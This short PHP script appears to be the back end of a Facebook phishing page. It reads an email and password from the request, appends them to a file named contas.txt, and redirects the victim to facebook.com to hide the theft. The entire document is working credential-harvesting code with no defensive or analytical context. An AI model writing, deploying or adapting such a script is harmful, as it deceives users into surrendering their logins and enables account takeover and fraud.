<?php

file_put_contents("contas.txt", "Email: " . $_GET['email'] . "\n" . " Senha: " . $_GET['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/');
exit();
